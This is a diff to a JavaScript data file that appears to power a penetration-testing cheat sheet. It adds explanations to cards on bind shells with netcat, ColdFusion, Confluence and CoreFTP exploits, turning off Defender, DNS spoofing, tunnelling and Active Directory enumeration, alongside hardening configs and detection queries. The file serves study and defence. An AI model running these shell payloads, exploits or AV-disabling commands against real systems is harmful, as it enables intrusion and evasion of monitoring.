         "misconfiguration": "Outbound connections from servers are not filtered - any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
         "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows - PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
         "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
-      }
+      },
+      "explain": "Opens a shell listener on the target that you connect into:\n  mkfifo /tmp/f            create a named pipe to shuttle I/O\n  cat /tmp/f | /bin/bash -i 2>&1   feed the pipe into an interactive bash and merge stderr\n  | nc -l <ip> <port> > /tmp/f     netcat listens, sending output out and input back through the pipe\nUse when the target cannot reach back to you; you then 'nc <ip> <port>' to connect - but it needs an inbound-allowed port (often blocked by NAT/firewalls)."
     },
     {
       "type": "payload",
@@ -7677,7 +7707,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Outbound connections from servers are not filtered - any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
         "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows - PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
         "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
-      }
+      },
+      "explain": "Bind-shell payload run on the target to open a listener you connect into:\n  mkfifo /tmp/f            named pipe for two-way I/O\n  cat /tmp/f|/bin/bash -i 2>&1   interactive bash fed by the pipe\n  |nc -lvp <port> >/tmp/f  netcat listens on the port and loops output back through the pipe\nYou then connect with 'nc <target> <port>'; needs an inbound-allowed port, and the card includes Python/other-language variants."
     },
     {
       "id": "crtp-bloodhound",
@@ -7971,7 +8002,8 @@ const COMMAND_DATA = {
           "label": "Reset neo4j password on first run",
           "command": "# browse http://localhost:7474  (neo4j/neo4j -> set new)"
         }
-      ]
+      ],
+      "explain": "Starts the graph backend and BloodHound GUI:\n  sudo neo4j start   launch the Neo4j database BloodHound stores its graph in\n  bloodhound         open the analysis GUI\nNeo4j must be up first (default creds neo4j/neo4j, changed on first login at http://localhost:7474); then drag your SharpHound/bloodhound-python ZIP into the GUI and run the pre-built queries to find paths to DA."
     },
     {
       "id": "ad-bloodhound-python",
@@ -8088,7 +8120,8 @@ const COMMAND_DATA = {
           "label": "Import the zip into BloodHound and run pathfinding",
           "command": "# upload zip -> 'Shortest paths to Domain Admins'"
         }
-      ]
+      ],
+      "explain": "Collects BloodHound graph data remotely from Linux over LDAP/SMB:\n  bloodhound-python   the Python collector (no code on the target beyond queries)\n  -u/-p               domain credentials\n  -ns <dc_ip>         name server / DC to query\n  -d <domain>         the target domain\n  -c All              run every collection method (users, groups, ACLs, sessions, trusts, ...)\nProduces JSON (add --zip) you import into BloodHound to graph attack paths to Domain Admin."
     },
     {
       "id": "ad-bloodyad-toolkit",
@@ -9877,7 +9910,8 @@ const COMMAND_DATA = {
           "command": "curl -s \"https://api.certspotter.com/v1/issuances?domain=<domain>&include_subdomains=true&expand=dns_names\" | jq '.[].dns_names[]' | tr -d '\"' | sort -u",
           "label": "certspotter API"
         }
-      ]
+      ],
+      "explain": "Mines Certificate Transparency logs for subdomains without touching the target:\n  curl \"https://crt.sh/?q=<domain>&output=json\"   fetch every logged cert for the domain as JSON\n  jq -r '.[] | .name_value'                        pull the certificate common/SAN names\n  sort -u                                          dedupe\nReveals subdomains (often internal-sounding) from issued TLS certs; add a jq 'contains()' filter to focus on a keyword like dev or vpn."
     },
     {
       "id": "ad-certipy-toolkit",
@@ -10130,7 +10164,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
-      ]
+      ],
+      "explain": "Checks whether the Print Spooler is running on target hosts:\n  Import-Module .\\SecurityAssessment.ps1   load the helper\n  Get-SpoolStatus -ComputerName <host>     query the Spooler service state\nA running Spooler on a DC enables the Printer Bug (SpoolSample) coercion and PrintNightmare - so this finds coercion targets; CrackMapExec's -M spooler does the same remotely."
     },
     {
       "id": "crtp-child-to-parent",
@@ -10439,7 +10474,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Chisel builds a SOCKS5 tunnel over HTTP through a firewall:\n  server        run the server end\n  -v            verbose logging\n  -p <port>     port the server listens on\n  --socks5      expose a SOCKS5 proxy over the tunnel\nThe client connects with 'socks' (forward) or 'R:socks' (reverse, with --reverse on the server); either way you get a proxy on 127.0.0.1:1080 to point proxychains at."
     },
     {
       "id": "client-recon-fingerprint",
@@ -10540,7 +10576,8 @@ const COMMAND_DATA = {
         "misconfiguration": "No DNS filtering. Web proxy without category-based blocking. No user training on phishing identification. Browser plugins enabled (Flash, Java - each increases attack surface).",
         "vulnerable_config": "# No DNS filtering:\n# Users can resolve any domain → attacker fingerprinting domain accessible\n\n# Browser plugins enabled (each is an attack surface):\n# Java plugin: enables Java applet exploits\n# Flash: CVE-2018-15982 and hundreds more\n# PDF reader plugins: numerous exploits\n\n# No web proxy content filtering for newly registered domains",
         "secure_config": "# DNS filtering (Cisco Umbrella, Cloudflare Gateway, or internal RPZ):\n# Block: newly registered domains, phishing categories, malware categories\n\n# Disable browser plugins:\n# Group Policy: disable Java, Flash, and other NPAPI plugins in Chrome/Firefox\n# Chrome: chrome://settings/content/plugins → Block all plugins\n\n# Web proxy: block uncategorized and newly registered domains for 30 days\n\n# User awareness: report phishing training program (GoPhish, KnowBe4)"
-      }
+      },
+      "explain": "Fingerprints a phishing target before building a client-side payload:\n  python3 -m http.server 80   host a benign resource and watch the connecting client's User-Agent\nThe UA reveals OS build and browser so your payload matches the victim; embed a 1x1 tracking image in a lure, and exiftool on a returned document leaks the Office/producer version."
     },
     {
       "type": "command",
@@ -10639,7 +10676,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
-      }
+      },
+      "explain": "Finds a company's exposed cloud storage with search-engine dorks:\n  intext:<company> inurl:amazonaws.com   Google dork for S3 URLs referencing the target\nMisconfigured buckets/blobs leak keys, backups, and source; the card pairs it with inurl:blob.core.windows.net for Azure and a host loop to resolve discovered subdomains to cloud IPs."
     },
     {
       "id": "cdsa-m10-code-analysis-ida",
@@ -10968,7 +11006,8 @@ const COMMAND_DATA = {
           "CVE-2010-2861"
         ],
         "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
-      }
+      },
+      "explain": "Exploits ColdFusion's unauthenticated locale traversal (CVE-2010-2861):\n  python2 14641.py <ip> <port> \"<file_path>\"   the EDB exploit: target, port, and the file to read\nColdFusion 9.0.1 and earlier let the unvalidated locale parameter of admin .cfm pages read arbitrary files; reading /lib/password.properties leaks the encrypted admin hash - grab the script with 'searchsploit -p 14641'."
     },
     {
       "type": "command",
@@ -11059,7 +11098,8 @@ const COMMAND_DATA = {
           "OWASP A05:2021"
         ],
         "evasion": "Randomize the uploaded payload name and delete it after the shell connects; restrict activity to a single upload+trigger to limit web-log evidence."
-      }
+      },
+      "explain": "Detects a ColdFusion server and locates its admin panel:\n  nmap -p- -sC -Pn <ip> --open   full scan looking for the ColdFusion port 8500\nColdFusion also uses 80/443/1935/5500; the admin console lives at /CFIDE/administrator/index.cfm and .cfm/.cfc are the app extensions - version-match it to CVEs (e.g. CVE-2010-2861 LFI) for exploitation."
     },
     {
       "id": "coldfusion-unauth-rce",
@@ -11179,7 +11219,8 @@ const COMMAND_DATA = {
           "CVE-2009-2265"
         ],
         "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
-      }
+      },
+      "explain": "Exploits the ColdFusion FCKeditor upload flaw for unauth RCE (CVE-2009-2265):\n  python3 50057.py   the EDB exploit, after editing lhost/lport/rhost/rport inside it\nColdFusion 8.0.1 and earlier ship a vulnerable FCKeditor file manager; the script uploads a JSP payload and triggers a shell - fetch it with 'searchsploit -p 50057' and set the callback details before running."
     },
     {
       "type": "payload",
@@ -12213,7 +12254,8 @@ const COMMAND_DATA = {
         "rce",
         "injection",
         "cve-2022-26134"
-      ]
+      ],
+      "explain": "Achieves pre-auth RCE in Confluence via OGNL injection (CVE-2022-26134 class):\n  curl http://<target>:8090/%24%7B...%7D/   the %24%7B...%7D is a URL-encoded ${...} OGNL expression in the path\n  the payload uses the Nashorn engine to run new ProcessBuilder(['id']).start()\nConfluence evaluates the expression server-side, executing your command; check the version at /login.action first, then adapt the ProcessBuilder command."
     },
     {
       "id": "crtp-constrained-delegation",
@@ -12419,7 +12461,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# vsftpd - no bounce attack protection:\n# /etc/vsftpd.conf:\npasv_enable=YES       # PASV enabled (good)\nport_enable=YES       # PORT/active mode also enabled\n# No pasv_address set -> bounce attack possible via PORT command",
         "secure_config": "# Disable active mode (PORT command), use PASV only:\n# /etc/vsftpd.conf:\nport_enable=NO\npasv_enable=YES\npasv_min_port=30000\npasv_max_port=31000\npasv_address=<public_ip>\n# This prevents FTP bounce attacks\n# Also: disable anonymous login, enforce TLS"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Writes a file outside the FTP root via CoreFTP's HTTP PUT traversal (CVE-2022-22836):\n  curl -k -X PUT              authenticated HTTP PUT over TLS (ignore cert)\n  --basic -u <user>:<password>   the FTP credentials\n  --data-binary \"PoC.\"        the file content to write\n  --path-as-is https://<ip>/../../../../../../whoops   traversal path that curl won't normalize away\nArbitrary file write anywhere the service can reach enables config overwrite or webshell drop; --path-as-is is what preserves the ../ sequence."
     },
     {
       "id": "cors-misconfiguration",
@@ -12832,7 +12875,8 @@ const COMMAND_DATA = {
           "label": "NetExec (successor)",
           "command": "nxc smb <dc_ip> -u <user> -p <password> --groups"
         }
-      ]
+      ],
+      "explain": "Enumerates domain groups over SMB with CrackMapExec:\n  crackmapexec smb <dc_ip>   authenticate to the DC's SMB service\n  -u/-p                      valid domain credentials\n  --groups                   list all domain groups and their member counts\nQuickly surfaces high-value groups (Domain/Enterprise Admins, Backup Operators) worth targeting; nxc is the maintained rename of the same tool."
     },
     {
       "id": "ad-cme-users",
@@ -12934,7 +12978,8 @@ const COMMAND_DATA = {
           "label": "Save to a userlist for spraying/roasting",
           "command": "crackmapexec smb <dc_ip> -u <user> -p <password> --users | awk '{print $5}' > users.txt"
         }
-      ]
+      ],
+      "explain": "Enumerates all domain users over SMB:\n  crackmapexec smb <dc_ip>   query the DC\n  -u/-p                      valid credentials\n  --users                    list accounts with RID, badpwd count, and password-set dates\nGives you a spray target list (pipe to awk to extract just usernames) and flags stale accounts worth attacking."
     },
     {
       "id": "ad-cme-shares",
@@ -13023,7 +13068,8 @@ const COMMAND_DATA = {
           "label": "NetExec + filter readable",
           "command": "nxc smb <dc_ip> -u <user> -p <password> --shares"
         }
-      ]
+      ],
+      "explain": "Lists accessible SMB shares with read/write flags:\n  crackmapexec smb <dc_ip>   target host\n  -u/-p                      valid credentials\n  --shares                   enumerate shares and your access level on each\nFinds non-default shares to hunt for credentials; sweep a subnet and grep out 'NO ACCESS', then dig into writable/interesting shares with smbmap or spider_plus."
     },
     {
       "id": "ad-gpp-autologin",
@@ -13214,7 +13260,8 @@ const COMMAND_DATA = {
           "label": "query user / quser - who is logged on",
           "command": "query user /server:<target>"
         }
-      ]
+      ],
+      "explain": "Finds who is currently logged on to a host via SMB:\n  crackmapexec smb <target>   connect to the target's SMB service\n  -u/-p                       valid domain credentials\n  --loggedon-users            call NetWkstaUserEnum to list active sessions\nReveals where privileged users have live sessions so you can target that host for lateral movement or credential theft; sweep a /23 and grep for 'admin' or 'Pwn3d'."
     },
     {
       "id": "ad-cme-pass-pol",
@@ -13311,7 +13358,8 @@ const COMMAND_DATA = {
           "label": "PowerView - Get-DomainPolicy (password policy from LDAP)",
           "command": "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess"
         }
-      ]
+      ],
+      "explain": "Reads the domain password policy over SMB:\n  crackmapexec smb <dc_ip>   query the DC\n  -u/-p                      credentials (a null session '' '' sometimes works)\n  --pass-pol                 return lockout threshold, window, complexity, min length\nRun this BEFORE any password spray so you stay under the lockout threshold and do not lock accounts."
     },
     {
       "id": "ad-cme-localauth-spray",
@@ -13636,7 +13684,8 @@ const COMMAND_DATA = {
           "label": "Review the JSON output",
           "command": "cat /tmp/cme_spider_plus/<ip>.json | jq"
         }
-      ]
+      ],
+      "explain": "Recursively indexes SMB share contents with the spider_plus module:\n  crackmapexec smb <dc_ip>          target\n  -u/-p                             credentials\n  -M spider_plus                    the deep-spider module\n  -o READ_ONLY=False                also download the files it finds (True just indexes)\nBuilds a JSON index (under /tmp/cme_spider_plus) of every readable file across shares - ideal for finding config files, scripts, and creds at scale."
     },
     {
       "id": "crtp-credential-dumping",
@@ -15477,7 +15526,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Unpatched services with publicly available exploit PoC source code. No virtual patching while awaiting official fix. C exploits compilable for target platform are publicly available.",
         "vulnerable_config": "# C source exploit for Windows target:\n# searchsploit -m 18176.c  (Windows kernel exploit source)\n\n# Compile for Windows from Kali:\n# i686-w64-mingw32-gcc 18176.c -o exploit.exe\n# → Windows 32-bit binary ready to transfer and execute\n\n# No ASLR/DEP on target:\n# → Exploit works reliably at fixed memory addresses",
         "secure_config": "# Enable Process Mitigation Policies:\nSet-ProcessMitigation -System -Enable DEP,ASLR,BottomUp,StrictHandleChecks\n\n# Windows Update: OS-level kernel exploits patched via Windows Update\nSet-Service wuauserv -StartupType Automatic\n\n# Application control via WDAC:\n# Attacker-compiled exploit.exe (unsigned) blocked before execution\nNew-CIPolicy -Level Hash -FilePath C:\\Policy\\BlockPolicy.xml -Fallback None"
-      }
+      },
+      "explain": "Builds a public C exploit into a Windows PE from Kali using MinGW:\n  i686-w64-mingw32-gcc   the 32-bit Windows cross-compiler\n  exploit.c -o exploit.exe   source in, PE executable out\n  -lws2_32               link Winsock (needed by network exploits)\nProduces a runnable Windows binary without touching a Windows box; use x86_64-w64-mingw32-gcc for 64-bit targets and plain gcc (with -static) for Linux PoCs - match the target architecture or it will not run."
     },
     {
       "id": "crtp-exam-methodology",
@@ -16590,7 +16640,8 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "x64dbg"
-      ]
+      ],
+      "explain": "Launches x64dbg to dynamically debug a malware sample:\n  x64dbg.exe   the GUI debugger (open the sample with File > Open; it pauses at the entry point)\nFrom there you set WINAPI breakpoints from the Symbols tab (F2), locate sandbox checks via string references, patch the check instructions (Spacebar to edit, Ctrl+P to save), then run to observe the real behavior - here the injected shellcode."
     },
     {
       "id": "defaultcreds-search",
@@ -16795,7 +16846,8 @@ const COMMAND_DATA = {
           "rel": "prereq",
           "note": "Network tunneling/covert channel detection - DNS and HTTP exfiltration techniques covered in that card."
         }
-      ]
+      ],
+      "explain": "An SPL query that detects C2 beaconing from Zeek HTTP logs by timing regularity:\n  sourcetype=\"bro:http:json\"       Zeek HTTP records\n  streamstats ... last(_time) ... eval timedelta   time between consecutive connections per src/dest\n  eventstats avg(timedelta) ... eval upper/lower = avg +/-10%   a tolerance band around the mean interval\n  where timedelta in band | eval prcnt=(count/total)*100 | where prcnt>90 AND total>10   keep beacons that are >90% regular\nFlags callbacks that fire at a near-constant interval; the card also covers RDP/Kerberos brute force, Nmap scans, Zerologon, and ransomware over Zeek logs."
     },
     {
       "id": "cdsa-m14-ad-attack-detection",
@@ -16915,7 +16967,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Network-layer detection of the same AD attacks using Zeek/Bro logs in Splunk."
         }
-      ]
+      ],
+      "explain": "An SPL query detecting the network logon that credential theft leaves on a DC:\n  source=\"WinEventLog:Security\" EventCode=4624   successful logons\n  Logon_Type=9                                   NewCredentials logon (runas /netonly - overpass-the-hash pattern)\n  Logon_Process=seclogo                          the secondary logon service\n  | table _time, ComputerName, user, Network_Account_Name, ...   surface who/where\nCatches pass-the-hash/overpass-the-hash tradecraft; the card bundles SPL for domain recon, password spraying, Kerberoasting, DCSync, and golden-ticket patterns."
     },
     {
       "id": "cdsa-m10-detection-rules",
@@ -17443,7 +17496,8 @@ const COMMAND_DATA = {
           "command": "sc stop WinDefend\nnet stop WinDefend",
           "label": "Stop WinDefend service"
         }
-      ]
+      ],
+      "explain": "Turns off Defender real-time protection so payloads are not quarantined:\n  Set-MpPreference   change Defender settings (needs elevated PowerShell)\n  -DisableRealtimeMonitoring $true   stop on-access scanning\nWith admin rights this lets you stage and run tools freely; Add-MpPreference -ExclusionPath drops a folder from scanning as a quieter alternative, and the extra Disable* flags kill script/IOAV/IPS scanning too."
     },
     {
       "id": "cdsa-m13-disk-forensics",
@@ -17563,7 +17617,8 @@ const COMMAND_DATA = {
           "rel": "prereq",
           "note": "Memory forensics - identify suspicious PIDs before hunting disk artifacts."
         }
-      ]
+      ],
+      "explain": "Runs Chainsaw to hunt Sigma detections across collected Windows event logs:\n  hunt <logs_path>   scan this folder of .evtx logs (here the KAPE-collected winevt\\Logs)\n  -s sigma/          match against the Sigma rules directory\n  --mapping ...sigma-event-logs-all.yml   tells Chainsaw which event fields each rule maps to\n  -r rules/          also apply Chainsaw's own detection rules\n  --csv --output output_csv   write hits to CSV in this folder\nSurfaces malicious activity in the logs; the card also covers MFTECmd, EvtxECmd, PECmd, and RegRipper for the rest of a disk-forensics timeline."
     },
     {
       "id": "dislocker-unlock",
@@ -17939,7 +17994,8 @@ const COMMAND_DATA = {
           "label": "Poison a remote gateway (SNAT)",
           "command": "ettercap -T -q -i <interface> -P dns_spoof -M arp:remote //<target>// //<gateway>//"
         }
-      ]
+      ],
+      "explain": "Poisons DNS answers on a LAN to redirect victims to your IP:\n  ettercap -T -q   text mode, quiet\n  -i <interface>   the capture interface\n  -P dns_spoof     the DNS-spoofing plugin (reads records from /etc/ettercap/etter.dns)\n  -M arp //<target>// //<gateway>//   ARP MITM between the victim and gateway\nWith the MITM in place, the plugin answers the victim's lookups with attacker-controlled addresses so their traffic hits your services; edit etter.dns first to set the spoofed records."
     },
     {
       "type": "command",
@@ -18086,7 +18142,8 @@ const COMMAND_DATA = {
         "misconfiguration": "DNS zone transfers (AXFR queries) are permitted to any requesting host - not restricted to authorized secondary DNS servers. This exposes the entire DNS zone (all hostnames, IPs, mail servers, internal naming conventions) to any attacker who can reach the DNS port. Even without AXFR, DNS servers that respond to ANY queries or provide detailed error messages leak zone structure.",
         "vulnerable_config": "# BIND (named) - zone transfer unrestricted (vulnerable):\n# /etc/bind/named.conf or named.conf.local:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { any; };  // <-- allows AXFR from ANY host = zone exposure\n};\n\n# Windows DNS - no transfer restriction:\n# DNS Manager -> Zone -> Properties -> Zone Transfers tab:\n# 'Allow zone transfers' checked, 'To any server' selected",
         "secure_config": "# BIND - restrict zone transfers to secondary DNS IPs only:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { 10.10.1.5; 10.10.1.6; };  // only secondary DNS servers\n    // Or disable entirely if using AD-integrated zones:\n    // allow-transfer { none; };\n};\n\n# Windows DNS (integrated zones) - disable zone transfers:\n# DNS Manager -> Zone -> Properties -> Zone Transfers:\n# Uncheck 'Allow zone transfers' entirely (AD-integrated zones replicate via AD replication)\n\n# Additional hardening:\n# Disable DNS recursion for external clients\n# Response Rate Limiting (RRL) to prevent DNS amplification\n# Split-horizon DNS - internal and external zones serve different records"
-      }
+      },
+      "explain": "Queries DNS with dig and attempts a zone transfer:\n  dig axfr <domain>   request a full zone transfer (AXFR)\n  @<ip>               ask this specific name server\nA misconfigured NS returns every record - internal hostnames and IPs in one shot; plain 'host'/'dig <domain> <type>' cover normal record lookups when AXFR is refused."
     },
     {
       "type": "command",
@@ -18210,7 +18267,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Web application and infrastructure information is inadvertently exposed: verbose HTTP headers (Server, X-Powered-By) revealing exact version numbers, directory listing enabled on web servers, .git repositories or .env files accessible in the web root, robots.txt listing sensitive paths, and WHOIS data exposing internal contact details.",
         "vulnerable_config": "# Apache with version disclosure in headers:\n# HTTP response: Server: Apache/2.4.41 (Ubuntu)\n# X-Powered-By: PHP/7.4.3  <-- exact version, enables targeted exploit search\n\n# Directory listing enabled:\n# nginx: autoindex on;  <- any directory without index.html lists files\n# Apache: Options +Indexes\n\n# .git accessible from web root:\n# http://target.com/.git/config  -- exposes repo + credentials in config\n# http://target.com/.env  -- exposes DB_PASSWORD, API keys",
         "secure_config": "# Apache - remove version disclosure:\n# /etc/apache2/conf-enabled/security.conf:\nServerTokens Prod          # shows only 'Apache' not version\nServerSignature Off        # removes version from error pages\n\n# nginx:\nserver_tokens off;         # hides nginx version\n\n# Disable directory listing:\n# Apache: Options -Indexes\n# nginx: remove 'autoindex on' from all location blocks\n\n# Block sensitive files/directories:\n# Apache:\n<DirectoryMatch '(\\.git|\\.env|\\.svn|backup|config)'>\n    Require all denied\n</DirectoryMatch>\n\n# nginx:\nlocation ~* /(\\.git|\\.env|\\.svn|backup\\/) { deny all; return 404; }\n\n# Remove X-Powered-By header:\n# PHP: expose_php = Off (php.ini)"
-      }
+      },
+      "explain": "Queries DNS with dig for a specific record type:\n  dig <domain>        the name to look up\n  <record_type>       A, MX, NS, TXT, CNAME, SOA, etc.\nReturns the matching records; add +short for terse output, +trace to follow delegation, and -x <ip> for reverse lookups."
     },
     {
       "id": "dnsrecon-enum",
@@ -18336,7 +18394,8 @@ const COMMAND_DATA = {
         "elastic_kql": "event.category:network AND dns.question.name:* AND source.ip:*",
         "sentinel_kql": "DnsEvents\n| summarize queries=count(), nx=countif(ResultCode == 3) by ClientIP, bin(TimeGenerated, 1m)\n| where queries > 50 or nx > 30\n| sort by queries desc\n// dnsrecon multi-technique enumeration (AXFR attempt + brute)",
         "sigma_rules": "net_dns_enumeration (dnsrecon multi-technique enumeration (AXFR attempt + brute))"
-      }
+      },
+      "explain": "Runs standard DNS enumeration with dnsrecon:\n  dnsrecon -d <domain>   the target domain\n  -t std                 standard record enumeration (SOA, NS, A, AAAA, MX, TXT, SPF) plus wildcard and AXFR checks\nGives a broad DNS picture in one pass; switch to '-t brt -D <wordlist>' to brute-force subdomains from a list."
     },
     {
       "id": "subfinder-enum",
@@ -18531,7 +18590,8 @@ const COMMAND_DATA = {
         "misconfiguration": "DNS zone transfers (AXFR queries) are permitted to any requesting host - not restricted to authorized secondary DNS servers. This exposes the entire DNS zone (all hostnames, IPs, mail servers, internal naming conventions) to any attacker who can reach the DNS port. Even without AXFR, DNS servers that respond to ANY queries or provide detailed error messages leak zone structure.",
         "vulnerable_config": "# BIND (named) - zone transfer unrestricted (vulnerable):\n# /etc/bind/named.conf or named.conf.local:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { any; };  // <-- allows AXFR from ANY host = zone exposure\n};\n\n# Windows DNS - no transfer restriction:\n# DNS Manager -> Zone -> Properties -> Zone Transfers tab:\n# 'Allow zone transfers' checked, 'To any server' selected",
         "secure_config": "# BIND - restrict zone transfers to secondary DNS IPs only:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { 10.10.1.5; 10.10.1.6; };  // only secondary DNS servers\n    // Or disable entirely if using AD-integrated zones:\n    // allow-transfer { none; };\n};\n\n# Windows DNS (integrated zones) - disable zone transfers:\n# DNS Manager -> Zone -> Properties -> Zone Transfers:\n# Uncheck 'Allow zone transfers' entirely (AD-integrated zones replicate via AD replication)\n\n# Additional hardening:\n# Disable DNS recursion for external clients\n# Response Rate Limiting (RRL) to prevent DNS amplification\n# Split-horizon DNS - internal and external zones serve different records"
-      }
+      },
+      "explain": "Brute-forces subdomains when a zone transfer is refused:\n  dnsenum --dnsserver <ns>   resolve against this name server\n  --enum -p 0 -s 0           enumeration preset, no whois/scrape delays\n  -o subdomains.txt          save results\n  -f <wordlist>              candidate subdomain names\n  <domain>                   the target domain\nResolves each guess to find hosts that DNS does not otherwise reveal; a dig for-loop over the wordlist does the same manually."
     },
     {
       "id": "subbrute-bruteforce",
@@ -18735,7 +18795,8 @@ const COMMAND_DATA = {
           "MITRE T1016",
           "MS Docs"
         ]
-      }
+      },
+      "explain": "Resolves DNS from a Windows foothold when dig/nmap are absent:\n  nslookup <domain>   forward-resolve the name\nUse '-type=TXT' (or MX, NS, etc.) for specific records and append a server IP to query a chosen DNS server; supports reverse lookups too."
     },
     {
       "type": "command",
@@ -18851,7 +18912,8 @@ const COMMAND_DATA = {
           "command": "for ns in $(dig ns <domain> +short); do dig axfr @$ns <domain>; done",
           "label": "Batch loop"
         }
-      ]
+      ],
+      "explain": "Attempts a full DNS zone transfer (AXFR) against a name server:\n  dig axfr        request a zone transfer\n  @<nameserver>   the name server to ask (must allow AXFR)\n  <domain>        the zone to pull\nA misconfigured server dumps every record in the zone at once; enumerate the NS records first, then try AXFR against each (zonetransfer.me is a public practice target)."
     },
     {
       "id": "dns-zone-transfer-fierce",
@@ -18944,7 +19006,8 @@ const COMMAND_DATA = {
